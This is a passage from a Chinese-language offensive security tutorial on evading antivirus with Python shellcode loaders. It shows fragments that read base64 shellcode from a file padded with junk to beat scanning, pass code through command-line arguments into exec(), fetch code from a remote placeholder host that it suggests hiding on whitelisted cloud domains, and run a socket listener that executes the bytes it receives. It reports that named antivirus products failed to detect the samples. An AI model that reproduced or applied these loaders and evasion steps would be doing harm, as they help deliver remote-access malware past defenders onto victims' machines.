title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Python-File-将shellcode从文本中提取"><a href="#➢-Python-File-将shellcode从文本中提取" class="headerlink" title="➢ Python-File-将shellcode从文本中提取"></a>➢ Python-File-将shellcode从文本中提取</h4><h4 id="➢-Python-Argv-将shellcode与加载器分离"><a href="#➢-Python-Argv-将shellcode与加载器分离" class="headerlink" title="➢ Python-Argv-将shellcode与加载器分离"></a>➢ Python-Argv-将shellcode与加载器分离</h4><h4 id="➢-Python-Http-将shellcode用远程协议加载"><a href="#➢-Python-Http-将shellcode用远程协议加载" class="headerlink" title="➢ Python-Http-将shellcode用远程协议加载"></a>➢ Python-Http-将shellcode用远程协议加载</h4><h4 id="➢-Python-Socket-将shellcode通过管道传输"><a href="#➢-Python-Socket-将shellcode通过管道传输" class="headerlink" title="➢ Python-Socket-将shellcode通过管道传输"></a>➢ Python-Socket-将shellcode通过管道传输</h4><h4 id="➢-Python-Images-将shellcode隐写进图片内"><a href="#➢-Python-Images-将shellcode隐写进图片内" class="headerlink" title="➢ Python-Images-将shellcode隐写进图片内"></a>➢ Python-Images-将shellcode隐写进图片内</h4></blockquote><blockquote><p>内存免杀是将shellcode直接加载进内存，由于没有文件落地，因此可以绕过文件扫描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。分离免杀包含对特征和行为的分离两个维度，把shellcode从放在程序转移到加载进内存，把整块的shellcode通过分块传输的方法上传然后再拼接，这些体现了基本的”分离“思想。</p></blockquote><h3 id="Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）"><a href="#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）" class="headerlink" title="#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）"></a>#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）</h3><blockquote><h5 id="python读取文件："><a href="#python读取文件：" class="headerlink" title="python读取文件："></a>python读取文件：</h5><p>with open(‘s.txt’,’r’) as f:</p><p>​    s&#x3D;f.read()</p></blockquote><h6 id="1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线"><a href="#1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线" class="headerlink" title="1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线"></a>1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000600828.png" alt="image-20230508000600828"></p><h6 id="将shellcode复制出来"><a href="#将shellcode复制出来" class="headerlink" title="将shellcode复制出来"></a>将shellcode复制出来</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000652155.png" alt="image-20230508000652155"></p><h6 id="创建file-1-py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b-以bit流传输，先将其base64编码后的结果打印出来"><a href="#创建file-1-py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b-以bit流传输，先将其base64编码后的结果打印出来" class="headerlink" title="创建file_1.py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b,以bit流传输，先将其base64编码后的结果打印出来"></a>创建file_1.py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b,以bit流传输，先将其base64编码后的结果打印出来</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000910355.png" alt="image-20230508000910355"></p><h6 id="在当前目录，创建一个s-txt文件，内容为上面打印出的内容"><a href="#在当前目录，创建一个s-txt文件，内容为上面打印出的内容" class="headerlink" title="在当前目录，创建一个s.txt文件，内容为上面打印出的内容"></a>在当前目录，创建一个s.txt文件，内容为上面打印出的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001030535.png" alt="image-20230508001030535"></p><h6 id="复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s-txt"><a href="#复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s-txt" class="headerlink" title="复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s.txt"></a>复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s.txt</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001344730.png" alt="image-20230508001344730"></p><h6 id="运行程序可以上线"><a href="#运行程序可以上线" class="headerlink" title="运行程序可以上线"></a>运行程序可以上线</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001408589.png" alt="image-20230508001408589"></p><h6 id="将file-1-py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下"><a href="#将file-1-py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下" class="headerlink" title="将file_1.py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下"></a>将file_1.py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001601883.png" alt="image-20230508001601883"></p><h6 id="将setup-py里面的内容对应修改成要打包成exe的py文件"><a href="#将setup-py里面的内容对应修改成要打包成exe的py文件" class="headerlink" title="将setup.py里面的内容对应修改成要打包成exe的py文件"></a>将setup.py里面的内容对应修改成要打包成exe的py文件</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001524511.png" alt="image-20230508001524511"></p><h6 id="执行命令进行编译"><a href="#执行命令进行编译" class="headerlink" title="执行命令进行编译"></a>执行命令进行编译</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001738788.png" alt="image-20230508001738788"></p><h6 id="在dist目录下会产生file-1-exe文件，将其放到x绒-x60，DF上面都没有被杀"><a href="#在dist目录下会产生file-1-exe文件，将其放到x绒-x60，DF上面都没有被杀" class="headerlink" title="在dist目录下会产生file_1.exe文件，将其放到x绒,x60，DF上面都没有被杀"></a>在dist目录下会产生file_1.exe文件，将其放到x绒,x60，DF上面都没有被杀</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001819819.png" alt="image-20230508001819819"></p><h6 id="将s-txt放到和exe文件相同的目录下，发现只有DF识别到了s-txt里面有恶意内容，被杀了，其他两个可以正常执行"><a href="#将s-txt放到和exe文件相同的目录下，发现只有DF识别到了s-txt里面有恶意内容，被杀了，其他两个可以正常执行" class="headerlink" title="将s.txt放到和exe文件相同的目录下，发现只有DF识别到了s.txt里面有恶意内容，被杀了，其他两个可以正常执行"></a>将s.txt放到和exe文件相同的目录下，发现只有DF识别到了s.txt里面有恶意内容，被杀了，其他两个可以正常执行</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002019614.png" alt="image-20230508002019614"></p><h6 id="在s-txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s-txt里面的内容"><a href="#在s-txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s-txt里面的内容" class="headerlink" title="在s.txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s.txt里面的内容"></a>在s.txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s.txt里面的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002256450.png" alt="image-20230508002256450"></p><h6 id="在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码"><a href="#在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码" class="headerlink" title="在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码"></a>在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码</h6><h6 id="（最后绕过了所有，没有被杀）"><a href="#（最后绕过了所有，没有被杀）" class="headerlink" title="（最后绕过了所有，没有被杀）"></a>（最后绕过了所有，没有被杀）</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002126083.png" alt="image-20230508002126083"></p><h3 id="Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）"><a href="#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）" class="headerlink" title="#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）"></a>#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）</h3><blockquote><p>import ctypes<br>import sys,base64</p><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    s&#x3D;sys.argv[1]<br>    sc&#x3D;base64.b64decode(s)<br>    z&#x3D;sys.argv[2]<br>    zx&#x3D;base64.b64decode(z)<br>    exec(zx)</p><p>在程序执行时，它会接收两个命令行参数。第一个参数<code>s</code>是一个经过Base64编码的字符串，通过<code>base64.b64decode()</code>解码后，将结果赋给变量<code>sc</code>。第二个参数<code>z</code>也是一个经过Base64编码的字符串，通过<code>base64.b64decode()</code>解码后，将结果赋给变量<code>zx</code>。</p><p>最后一行使用<code>exec()</code>函数来执行变量<code>zx</code>中的代码。<code>exec()</code>函数用于执行动态生成的Python代码。这意味着，如果你将一段可执行的Python代码作为第二个命令行参数传递给这个脚本，它将会执行该代码。</p></blockquote><p>核心代码：</p><p>z&#x3D;sys.argv[1]</p><p>zx&#x3D;base64.b64decode(z)</p><p>exec(zx)</p><h6 id="示例理解sys-argv函数"><a href="#示例理解sys-argv函数" class="headerlink" title="示例理解sys.argv函数"></a>示例理解sys.argv函数</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004559866.png" alt="image-20230508004559866"></p><h6 id="这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1"><a href="#这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1" class="headerlink" title="这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1"></a>这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004725697.png" alt="image-20230508004725697"></p><h6 id="而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）"><a href="#而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）" class="headerlink" title="而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）"></a>而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004855443.png" alt="image-20230508004855443"></p><h6 id="但是如果后面直接写这些上线语句的话，会有格式问题空格等"><a href="#但是如果后面直接写这些上线语句的话，会有格式问题空格等" class="headerlink" title="但是如果后面直接写这些上线语句的话，会有格式问题空格等"></a>但是如果后面直接写这些上线语句的话，会有格式问题空格等</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005030365.png" alt="image-20230508005030365"></p><h6 id="所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import-base6解码操作，后面手动编码传入"><a href="#所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import-base6解码操作，后面手动编码传入" class="headerlink" title="所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import base6解码操作，后面手动编码传入"></a>所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import base6解码操作，后面手动编码传入</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005252388.png" alt="image-20230508005252388"></p><h6 id="执行代码里面添加解码操作"><a href="#执行代码里面添加解码操作" class="headerlink" title="执行代码里面添加解码操作"></a>执行代码里面添加解码操作</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005142518.png" alt="image-20230508005142518"></p><h6 id="将shellcode代码里面的内容base64编码"><a href="#将shellcode代码里面的内容base64编码" class="headerlink" title="将shellcode代码里面的内容base64编码"></a>将shellcode代码里面的内容base64编码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005606332.png" alt="image-20230508005606332"></p><h6 id="将执行的代码打包成exe"><a href="#将执行的代码打包成exe" class="headerlink" title="将执行的代码打包成exe"></a>将执行的代码打包成exe</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005736198.png" alt="image-20230508005736198"></p><h6 id="执行exe，后面接上编码后的内容"><a href="#执行exe，后面接上编码后的内容" class="headerlink" title="执行exe，后面接上编码后的内容"></a>执行exe，后面接上编码后的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005910611.png" alt="image-20230508005910611"></p><h6 id="成功上线，而且杀软全部绕过"><a href="#成功上线，而且杀软全部绕过" class="headerlink" title="成功上线，而且杀软全部绕过"></a>成功上线，而且杀软全部绕过</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005926223.png" alt="image-20230508005926223"></p><h3 id="Python-Http-将shellcode用远程协议加载（全绕过）"><a href="#Python-Http-将shellcode用远程协议加载（全绕过）" class="headerlink" title="#Python-Http-将shellcode用远程协议加载（全绕过）"></a>#Python-Http-将shellcode用远程协议加载（全绕过）</h3><p>核心代码：</p><p>all&#x3D;requests.get(‘<a href="http://www.xxxx.com/all.txt').text">http://www.xxxx.com/all.txt&#39;).text</a></p><h6 id="将代码打包成exe"><a href="#将代码打包成exe" class="headerlink" title="将代码打包成exe"></a>将代码打包成exe</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508105240876.png" alt="image-20230508105240876"></p><h6 id="把下列代码复制到远程服务器网站的111-txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心-放到xxx-aliyun-com类似域名上的网站"><a href="#把下列代码复制到远程服务器网站的111-txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心-放到xxx-aliyun-com类似域名上的网站" class="headerlink" title="把下列代码复制到远程服务器网站的111.txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心,放到xxx.aliyun.com类似域名上的网站"></a>把下列代码复制到远程服务器网站的111.txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心,放到xxx.aliyun.com类似域名上的网站</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508104236993.png" alt="image-20230508104236993"></p><h6 id="一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到"><a href="#一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到" class="headerlink" title="一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到"></a>一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508104929818.png" alt="image-20230508104929818"></p><h3 id="Python-Socket-将shellcode通过管道传输（全绕过）"><a href="#Python-Socket-将shellcode通过管道传输（全绕过）" class="headerlink" title="#Python-Socket-将shellcode通过管道传输（全绕过）"></a>#Python-Socket-将shellcode通过管道传输（全绕过）</h3><blockquote><p>Socket隧道技术是一种用于在网络上建立隐蔽通信通道的技术。它可以将数据通过网络传输，同时隐藏数据的内容和传输的路径，使得检测和干扰变得更加困难。</p><p>Socket隧道通常涉及两个角色：客户端和服务端。</p><p>客户端：客户端是发起隧道连接的一方。它负责将要传输的数据进行封装并通过Socket连接发送到服务端。客户端还负责接收从服务端返回的数据，并将其解封装并提供给应用程序使用。</p><p>服务端：服务端是接收来自客户端的连接请求的一方。它监听指定的端口，等待客户端的连接。一旦客户端连接成功，服务端负责接收从客户端发送过来的数据，并进行解封装，然后将数据传递给目标服务器或应用程序。</p><h6 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h6><ol><li>客户端和服务端建立起Socket连接。</li><li>客户端将要传输的数据进行封装，例如加密、编码等操作，然后通过Socket连接发送到服务端。</li><li>服务端接收到客户端发送的数据后，进行解封装，恢复原始数据。</li><li>服务端将解封装后的数据转发给目标服务器或应用程序，实现数据的转发或代理功能。</li><li>目标服务器或应用程序将返回的数据发送给服务端。</li><li>服务端将接收到的数据再次进行封装，通过Socket连接发送给客户端。</li><li>客户端接收到服务端发送的数据后，进行解封装，恢复原始数据，并提供给应用程序使用</li></ol></blockquote><h6 id="参考：【python】–-Socket接收大数据-Wilson-Blogs-博客园-cnblogs-com"><a href="#参考：【python】–-Socket接收大数据-Wilson-Blogs-博客园-cnblogs-com" class="headerlink" title="参考：【python】– Socket接收大数据 - Wilson_Blogs - 博客园 (cnblogs.com)"></a>参考：<a href="https://www.cnblogs.com/Keep-Ambition/p/7459213.html">【python】– Socket接收大数据 - Wilson_Blogs - 博客园 (cnblogs.com)</a></h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508111648144.png" alt="image-20230508111648144"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>(<span class="params">data</span>):</span><br><span class="line">​    执行code</span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​    conn,addr = server.accept()</span><br><span class="line">​    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">​        zx(data)</span><br></pre></td></tr></table></figure><h6 id="比如上述代码，先启动服务端代码，监听本地端口"><a href="#比如上述代码，先启动服务端代码，监听本地端口" class="headerlink" title="比如上述代码，先启动服务端代码，监听本地端口"></a>比如上述代码，先启动服务端代码，监听本地端口</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114528304.png" alt="image-20230508114528304"></p><h6 id="再启动客户端代码，代码是去连接其服务器的端口"><a href="#再启动客户端代码，代码是去连接其服务器的端口" class="headerlink" title="再启动客户端代码，代码是去连接其服务器的端口"></a>再启动客户端代码，代码是去连接其服务器的端口</h6><p><img 